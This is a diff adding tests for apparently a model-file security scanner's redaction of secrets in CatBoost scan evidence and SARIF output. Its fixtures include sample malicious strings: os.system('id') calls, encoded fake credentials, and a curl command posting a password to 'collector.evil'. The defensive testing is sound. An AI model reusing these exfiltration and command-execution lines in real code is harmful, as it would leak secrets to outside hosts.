@@ -2136,3 +2136,78 @@ def test_catboost_regression_routes_to_catboost_scanner(tmp_path: Path) -> None:
 
     assert detect_file_format_from_magic(str(model_path)) == "catboost"
     assert detect_file_format(str(model_path)) == "catboost"
+
+
+def test_catboost_redacts_short_base64_sensitive_assignment() -> None:
+    payload = base64.b64encode(b"token=short7").decode().rstrip("=")
+
+    assert len(payload) < 20
+    assert _redact_evidence_for_display(payload) == "token=<redacted>"
+
+
+def test_catboost_preserves_short_base64_benign_assignment() -> None:
+    payload = base64.b64encode(b"mode=fast").decode().rstrip("=")
+
+    assert len(payload) < 20
+    assert _redact_evidence_for_display(payload) == payload
+
+
+def test_catboost_redacts_bytes_literal_collection_evidence() -> None:
+    payload = base64.b64encode(b"api_key=bytespass8 os.system('id')").decode()
+    chunks = [payload[:10].encode(), payload[10:22].encode(), payload[22:].encode()]
+    evidence = repr(chunks)
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "bytespass8" not in redacted
+    assert "api_key=<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+def test_catboost_preserves_benign_bytes_literal_collection() -> None:
+    payload = base64.b64encode(b"mode=fast").decode()
+    evidence = repr([payload[:4].encode(), payload[4:].encode()])
+
+    assert _redact_evidence_for_display(evidence, max_chars=500) == evidence
+
+
+def test_catboost_redacts_short_hex_escaped_provider_prefix() -> None:
+    evidence = r'\x73\x6b-HEXSHORTSECRET1234; os.system("id")'
+
+    redacted = _redact_evidence_for_display(evidence, max_chars=500)
+
+    assert "HEXSHORTSECRET1234" not in redacted
+    assert "<redacted>" in redacted
+    assert "os.system" in redacted
+
+
+def test_catboost_preserves_short_hex_escape_near_match() -> None:
+    evidence = r'\x73\x6betch-label; os.system("id")'
+
+    assert _redact_evidence_for_display(evidence, max_chars=500) == evidence
+
+
+def test_catboost_sarif_redacts_follow_up_reversible_secret_variants(tmp_path: Path) -> None:
+    short_payload = base64.b64encode(b"token=short7").decode().rstrip("=")
+    bytes_payload = base64.b64encode(b"api_key=bytespass8 os.system('id')").decode()
+    bytes_evidence = repr([bytes_payload[:10].encode(), bytes_payload[10:22].encode(), bytes_payload[22:].encode()])
+    evidence = [
+        "subprocess.run(['curl','--password','argvpass9','https://collector.evil/upload'])",
+        f'import os; {short_payload}; os.system("id")',
+        'AWSSECRETACCESSKEY=awspass10 os.system("id")',
+        f'{bytes_evidence}; os.system("id")',
+        r'\x73\x6b-HEXSHORTSECRET1234; os.system("id")',
+    ]
+    model_path = tmp_path / "catboost_reversible_follow_up.cbm"
+    model_path.write_bytes(_build_cbm(evidence))
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in ("short7", "bytespass8", "argvpass9", "awspass10", "HEXSHORTSECRET1234"):
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "<redacted>" in failed_details
+    assert "<redacted>" in sarif
